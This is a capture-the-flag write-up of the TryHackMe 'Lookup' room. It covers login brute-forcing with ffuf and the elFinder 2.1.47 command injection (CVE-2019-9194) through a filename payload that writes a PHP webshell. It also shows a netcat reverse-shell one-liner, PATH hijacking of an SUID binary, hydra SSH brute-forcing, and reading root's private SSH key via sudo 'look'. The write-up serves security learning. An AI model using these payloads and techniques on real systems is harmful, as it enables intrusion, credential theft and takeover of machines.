---
title: "TryHackMe: Lookup"
author: jaxafed
categories: [TryHackMe]
tags: [web, vhost, brute-force, command injection, suid, path hijacking, sudo, arbitary file read]
render_with_liquid: false
media_subpath: /images/tryhackme_lookup/
image:
  path: room_image.webp
---

**Lookup** started with brute-forcing a login form to discover a set of credentials. Using these credentials to log in, we found a virtual host (**vhost**) with an **elFinder** installation. By exploiting a **command injection** vulnerability in **elFinder**, we managed to get a shell on the machine. Then, by abusing **PATH hijacking** to manipulate the behavior of an **SUID binary**, we obtained a list of passwords. Testing them against the **SSH** service, we discovered another set of credentials and used **SSH** to gain a shell as a different user. As this user, we leveraged our **sudo** privileges to read the private **SSH** key of the **root** user and used it to gain a shell as **root**.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/lookup){: .center }

## Initial Enumeration

### Nmap Scan

As usual, we start with an `nmap` scan.

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.150.247
Nmap scan report for 10.10.150.247
Host is up (0.082s latency).
Not shown: 65496 closed tcp ports (reset), 37 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports:

- **22** (`SSH`)
- **80** (`HTTP`)

### Web 80

`Nmap` already informs us that port **80** redirects to `http://lookup.thm`, so we add it to our hosts file.

```
10.10.150.247 lookup.thm
```
{: file="/etc/hosts" }

Visiting `http://lookup.thm`, we are presented with a login form.

![Web 80 Index](web_80_index.webp){: width="1200" height="600" }

## Shell as www-data

### Brute-forcing the Credentials

Testing the form with random credentials, we receive the `Wrong username or password.` error and are redirected back to the form.

![Web 80 Login One](web_80_login1.webp){: width="1200" height="600" }

Trying a couple of common usernames, we get an interesting result when using `admin` as the username. Instead of the previous error, we receive the `Wrong password.` message.

![Web 80 Login Two](web_80_login2.webp){: width="1200" height="600" }

It seems the application returns different error messages for valid and invalid usernames. We can use this to enumerate valid users with `ffuf`.

```console
$ ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=FUZZ&password=test' -w /usr/share/seclists/Usernames/Names/names.txt -mc all -ic -fs 74 -t 100
...
admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 90ms]
jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 132ms]
```
{: .wrap }

With this, we discover two valid users: `admin` and `jose`.

Brute-forcing the password for the `jose` user with `ffuf`, we manage to discover the password for the user.

```console
$ ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=jose&password=FUZZ' -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -mc all -ic -fs 62 -t 100

pa[REDACTED]23             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 134ms]
```
{: .wrap }

Using the discovered credentials to log in through the form at `http://lookup.thm/`, we are redirected to `http://files.lookup.thm/`.

![Web 80 Login Three](web_80_login3.webp){: width="1000" height="600" }

Adding it to the hosts file as well.

```
10.10.150.247 lookup.thm files.lookup.thm
```
{: file="/etc/hosts" }

### elFinder Command Injection

Visiting `http://files.lookup.thm/`, we are redirected to `http://files.lookup.thm/elFinder/elfinder.html`, where we find an **elFinder** installation.

![Web 80 Files Index](web_80_files_index.webp){: width="1200" height="600" }

Clicking the `About this software` button, we discover that the application version is **2.1.47**.

![Web 80 Files Index Two](web_80_files_index2.webp){: width="1200" height="600" }

Looking for vulnerabilities in **elFinder 2.1.47**, we find **CVE-2019-9194**, a command injection vulnerability.

There is a detailed [advisory published by Synacktiv](https://www.synacktiv.com/ressources/advisories/elFinder_2.1.47_Command_Injection.pdf) that explains the vulnerability, which I recommend checking out.

Basically, **elFinder** not only allows us to upload images but also perform operations on the uploaded images, such as resizing or rotating them.

The application uses the `exiftran` program to perform the `rotate` operation, and the vulnerability lies in how it calls this program.

This is the vulnerable code:

```php
protected function imgRotate($path, $degree, $bgcolor = '#ffffff', $destformat = null, $jpgQuality = null) {
    [...]
    // Try lossless rotate
    if ($degree % 90 === 0 && in_array($s[2], array(IMAGETYPE_JPEG, IMAGETYPE_JPEG2000))) {
        $count = ($degree / 90) % 4;
        [...]
        
        $quotedPath = escapeshellarg($path);
        $cmds = array();
        
        if ($this->procExec(ELFINDER_EXIFTRAN_PATH . ' -h') === 0) {
            $cmds[] = ELFINDER_EXIFTRAN_PATH . ' -i ' . $exiftran[$count] . ' ' . $path;
        }
        
        if ($this->procExec(ELFINDER_JPEGTRAN_PATH . ' -version') === 0) {
            $cmds[] = ELFINDER_JPEGTRAN_PATH . ' -rotate ' . $jpegtran[$count] . ' -copy all -outfile ' . $quotedPath . ' ' . $quotedPath;
        }
        
        // Execute commands
        foreach ($cmds as $cmd) {
            if ($this->procExec($cmd) === 0) {
                $result = true;
                break;
            }
        }
        
        if ($result) {
            return $path;
        }
    }
}
```

As we can see from the vulnerable code snippet, it first uses `escapeshellarg` with the image path to escape malicious characters, saving the escaped string in the `quotedPath` parameter. Then, it checks if the `exiftran` program exists by running `exiftran -h` and checking the exit code. If the program exists, it builds the command to run as:

```console
ELFINDER_EXIFTRAN_PATH . ' -i ' . $exiftran[$count] . ' ' . $path
```

This command is then passed to the `procExec` function, which executes it using `sh`.

The issue arises because, when building the command, it uses the unescaped path variable (`$path`) instead of the escaped path variable (`$quotedPath`) and since we can control the image name (and thus the path variable), this allows us to inject commands.

We can also see how the fix for the vulnerability was implemented by checking the commit [374c88d7030eb92749267e17a4af21cc7520efa5](https://github.com/Studio-42/elFinder/commit/374c88d7030eb92749267e17a4af21cc7520efa5#diff-85602823cf2cdaf2502dc4f1b97001ffc0f083652aef175d9f068a5bfe90ca71).

![Elfinder Fix](elfinder_fix.webp){: width="1000" height="400" }

As we can see from the commit, they switched to using the escaped `$quotedPath` argument while building the command to run, preventing the command injection. They also included `--` before the file name to signal to `exiftran` that anything after that is the file to operate on, thus preventing argument injection.

Now that we have detailed information about the vulnerability, we can move on to exploiting it.

To do this, we will first upload a regular `JPEG` image to **elFinder**.

![Web 80 Files Exploit](web_80_files_exploit.webp){: width="1200" height="600" }

Next, we will rename our image as `$(<payload>).jpg`. This is because we know that our file name will be passed to the `sh` process via `procExec`, and `$()` is used for command substitution in `sh`. It will first execute the command inside `$()` and then replace it with the output of that command before running the actual command.

For example, we can see this in action as follows:

```console
$ echo "Whoami: $(whoami)"
Whoami: kali
```

As shown in the example, `sh` runs the command inside `$()` first, which is `whoami`, and outputs `kali`. It then replaces the `$()` with the output of the command and executes the actual command as `echo "Whoami: kali"`. So, by the same logic, by naming our file `$(<payload>).jpg`, we make it execute our payload before the `exiftran` command.

For our payload, we will create one that writes a `PHP` webshell to the system.

To avoid any special characters in our payload, we will send the contents of our webshell in hex-encoded format.

```console
$ echo '<?php system($_GET["c"]); ?>' | xxd -p
3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a
```

So, our final payload for the file name will be:

```console
$(echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > shell.php).jpg
```

This payload will `echo` the hex-encoded `PHP` webshell and pipe it to `xxd`, which will decode it. We then use `> shell.php` to write the decoded output to a `shell.php` file on the server.

Now, let's rename our image with the payload.

![Web 80 Files Exploit Two](web_80_files_exploit2.webp){: width="1200" height="600" }

![Web 80 Files Exploit Three](web_80_files_exploit3.webp){: width="1200" height="600" }

After renaming the file, we can right-click on the image (with the name set to our payload) and select the `Resize & Rotate` option.

![Web 80 Files Exploit Four](web_80_files_exploit4.webp){: width="1200" height="600" }

Now, all we have to do is select the `Rotate` option, rotate the image, and click the `Apply` button.

![Web 80 Files Exploit Five](web_80_files_exploit5.webp){: width="1200" height="600" }

After that, we will see an error message indicating the rotate option failed, since our command will return nothing. It will attempt to run the `exiftran` command as such, and that will cause an error since the `".jpg"` file does not exist.

```console
exiftran -i -9 [...]/elFinder/files/.jpg
```

However, this means we were successful, and our payload has been executed.

![Web 80 Files Exploit Six](web_80_files_exploit6.webp){: width="1200" height="600" }

We can confirm this by making a request to our webshell at `http://files.lookup.thm/elFinder/php/shell.php`, and we are successful at executing commands.

```console
$ curl -s 'http://files.lookup.thm/elFinder/php/shell.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Sending a reverse shell payload using `curl`.

```console
$ curl -s 'http://files.lookup.thm/elFinder/php/shell.php' --get --data-urlencode 'c=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.72.22 443 >/tmp/f'
```
{: .wrap }

With that, we got a shell in our listener, and after stabilizing it, we can see that it is as the `www-data` user.

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.150.247] 58106
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ export TERM=xterm
<kup.thm/public_html/elFinder/php$ export TERM=xterm
www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ ^Z
zsh: suspended  nc -lvnp 443

$ stty raw -echo; fg
[2]  - continued  nc -lvnp 443

www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as think

### Reverse-engineering the SUID Binary

Checking the machine for any binaries with the `suid` bit set, we find the `/usr/sbin/pwm` binary.

```console
www-data@lookup:/var/www$ find / -perm -u=s 2>/dev/null
...
/usr/sbin/pwm
...
```

Running it, the binary claims to be running the `id` command to find the username, then attempts to open the `/home/<username>/.passwords` file. In our case, it fails because the `/home/www-data/.passwords` file does not exist.

```console
www-data@lookup:/var/www$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

But checking the `/home/think/`, we find that the `.passwords` file exists there. Therefore, we might be able to use the `pwm` binary to read this file and discover the password for the `think` user.

```console
www-data@lookup:/var/www$ ls -la /home/think/
...
-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
...
```

First, let's download the `pwm` binary so we can reverse engineer it. To do this, we can simply copy it to one of the web application's directories and download it from the web server.

```console
www-data@lookup:/var/www$ cp /usr/sbin/pwm /var/www/lookup.thm/public_html/pwm

$ wget http://lookup.thm/pwm
```

Opening it in `Ghidra` and checking the `main` function, we can get a decompilation as follows:

![Pwm Decompilation](pwm_decompilation.webp){: width="1000" height="600" }

The application is fairly simple:

- First, it prints the message we saw about running the `id` command.

```c
puts("[!] Running \'id\' command to extract the username and user ID (UID)");
```

- Then, it copies the `"id"` string to the `local_e8` variable and runs it by passing it to the `popen` function.

```c
snprintf(local_e8,100,"id");
pFVar2 = popen(local_e8,"r");
```

- If it fails to run the command, it prints an error message and exits.

```c
if (pFVar2 == (FILE *)0x0) {
perror("[-] Error executing id command\n");
uVar3 = 1;
}
```

- If it was successful, then it tries to extract the username from the output of the `id` command with `uid=%*u(%[^)])` and saves it in the `local_128` parameter. The format `uid=%*u(%[^)])` means it looks for a string starting with `uid=`, followed by an unsigned integer, and then captures everything inside the parentheses, excluding the closing parenthesis. For example, with the output of the `id` command being `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, the `local_128` parameter would be `www-data`. If it can't extract the username, it prints an error message and exits.

```c
iVar1 = __isoc99_fscanf(pFVar2,"uid=%*u(%[^)])",local_128);
if (iVar1 == 1) {
...
}
else {
  perror("[-] Error reading username from id command\n");
  uVar3 = 1;
}
```

- After that, it prints the extracted username, builds the string `/home/<username>/.passwords`, and tries to open it as a file. If it fails, it prints an error message and exits. If it successfully opens the file, it prints the contents of the file character by character.

```c
printf("[!] ID: %s\n",local_128);
pclose(pFVar2);
snprintf(local_78,100,"/home/%s/.passwords",local_128);
pFVar2 = fopen(local_78,"r");
if (pFVar2 == (FILE *)0x0) {
  printf("[-] File /home/%s/.passwords not found\n",local_128);
  uVar3 = 0;
}
else {
  while( true ) {
    iVar1 = fgetc(pFVar2);
    if ((char)iVar1 == -1) break;
    putchar((int)(char)iVar1);
  }
  fclose(pFVar2);
  uVar3 = 0;
}
```

### Path Hijacking

The problem with the binary is that it runs the `id` command with a relative path, which allows us to hijack it by manipulating the `PATH` environment variable.

When we run a program without an absolute path, Linux tries to find the path to the executable by utilizing the value of the `PATH` environment variable.

We can see the value of the `PATH` variable as follows:

```console
www-data@lookup:/var/www$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

So, for example, when we run the `id` command, it starts from the left and checks each directory in the `PATH` variable for the `id` executable. If it finds it in a directory, it runs that executable.

The thing is, we are able to modify the value of the `PATH` variable. What we can do is create an executable named `id`, in this case, a bash script that outputs `uid=33(think) gid=33(www-data) groups=33(www-data)` in `/tmp`, and make it executable by everyone as follows:

```console
www-data@lookup:/tmp$ echo -e '#!/bin/bash\necho "uid=33(think) gid=33(www-data) groups=33(www-data)"' > /tmp/id
www-data@lookup:/tmp$ chmod 777 /tmp/id
```
{: .wrap }

Next, we can modify the `PATH` variable to put `/tmp` first, before any other directory, as such:

```console
www-data@lookup:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@lookup:/tmp$ export PATH=/tmp:$PATH
www-data@lookup:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

As we can see, now when we run the `id` command, it executes `/tmp/id` instead of `/usr/bin/id`, and we get our modified output:

```console
www-data@lookup:/tmp$ which id
/tmp/id
www-data@lookup:/tmp$ id
uid=33(think) gid=33(www-data) groups=33(www-data)
```

Now, we can run the `/usr/sbin/pwm` binary, and due to the modified `PATH` variable, it will also run `/tmp/id`, get `uid=33(think) gid=33(www-data) groups=33(www-data)` as the output of the `id` command, extract the username as `think`, and then print the contents of the `/home/think/.passwords` file as follows:

```console
www-data@lookup:/tmp$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
...
jose.2856171
```

### Brute-forcing the Password

Now that we have a list of possible passwords for the `think` user, we can use `hydra` to test them against the `SSH` service to see if any of them is valid.

```console
$ hydra -l think -P passwords.txt ssh://lookup.thm
...
[22][ssh] host: lookup.thm   login: think   password: jo[REDACTED]k)
1 of 1 target successfully completed, 1 valid password found
```

Since we discovered a valid password, we can use **SSH** to obtain a shell as the `think` user and read the user flag at `/home/think/user.txt`.

```console
$ ssh think@lookup.thm
...
think@lookup:~$ wc -c user.txt
33 user.txt
```

## Shell as root

### Sudo Privilege

Checking the `sudo` privileges for the `think` user, we can see that we are able to run the `look` binary as `root`.

```console
think@lookup:~$ sudo -l
[sudo] password for think:
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

The `look` binary is similar to `grep` in a sense that its main purpose is to search for lines in a file beginning with a specified string. If it finds any lines that start with the specified string, it prints them.

We can turn this into **arbitrary file read** by specifying the string to search as an empty string, which means every line in the file will match, and it will print the contents of the whole file. We can also see [this method mentioned here in GTFOBins](https://gtfobins.github.io/gtfobins/look/#suid).

Using this method, we are successful at reading the private **SSH** key for the `root` user as such:

```console
think@lookup:~$ sudo /usr/bin/look '' /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==
-----END OPENSSH PRIVATE KEY-----
```

We can save this private key in a file, set the correct permissions for it, and then use it with **SSH** to gain a shell as the `root` user. From there, we can read the root flag at `/root/root.txt` and complete the room.

```console
$ chmod 600 id_rsa

$ ssh -i id_rsa root@lookup.thm
...
root@lookup:~# wc -c root.txt
33 root.txt
```

## Unintended www-data to root

Looking back at how the `/usr/sbin/pwm` binary works, we know that it extracts everything within parentheses for the `uid` field in the output of the `id` command as the username.

After that, it uses the extracted username without any filtering to build the filename to read and prints the contents of it.

So, what we can do is, instead of providing a username like `think` (which builds the filename as `/home/think/.passwords`), we can provide a directory traversal payload as the username to make it read the `.passwords` file from any part of the filesystem. Additionally, we can make this `.passwords` file a symlink to any file we want to read, achieving arbitrary file read.

To exploit this, let's create our `id` executable with a directory traversal payload as the username and modify our `PATH` variable to hijack the actual `id` command, as shown below:

```console
www-data@lookup:/var/www/html$ echo -e '#!/bin/bash\necho "uid=33(../var/www/html) gid=33(www-data) groups=33(www-data)"' > /var/www/html/id
www-data@lookup:/var/www/html$ chmod 777 /var/www/html/id
www-data@lookup:/var/www/html$ export PATH=/var/www/html:$PATH
www-data@lookup:/var/www/html$ which id
/var/www/html/id
www-data@lookup:/var/www/html$ id
uid=33(../var/www/html) gid=33(www-data) groups=33(www-data)
```
{: .wrap }

> We are using `/var/www/html` instead of `/tmp` or `/dev/shm`, because `fs.protected_symlinks` is enabled on the host. This means that any `symlink` created in a world-writable directory like `/tmp` or `/dev/shm` will not be followed. While we could still create the `id` executable in those directories and only put the `symlink` in `/var/www/html`, preparing everything in a single directory is simpler.  
{: .prompt-tip }

As we can see, now our `id` command outputs:  
`uid=33(../var/www/html) gid=33(www-data) groups=33(www-data)`,  
which means that the `/usr/sbin/pwm` binary will extract `../var/www/html` as the username and build the file name as `/home/../var/www/html/.passwords`.

Next, we can create `/home/../var/www/html/.passwords` (`/var/www/html/.passwords`) as a symlink pointing to any file we want to read as `root`. For example, `/root/.ssh/id_rsa` in our case, as follows:

```console
www-data@lookup:/var/www/html$ ln -s /root/.ssh/id_rsa /var/www/html/.passwords
www-data@lookup:/var/www/html$ ls -la /var/www/html/.passwords
lrwxrwxrwx 1 www-data www-data 17 Nov 25 22:53 /var/www/html/.passwords -> /root/.ssh/id_rsa
```

Finally, running `/usr/sbin/pwm`, we can see it works exactly as we anticipated, extracting the username as `../var/www/html` and printing the contents of `/home/../var/www/html/.passwords`, which is a symlink to `/root/.ssh/id_rsa`. This allows us to obtain the private **SSH** key of the `root` user, which we can then use to gain a shell as `root`.

```console
www-data@lookup:/var/www/html$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: ../var/www/html
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==
-----END OPENSSH PRIVATE KEY-----
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>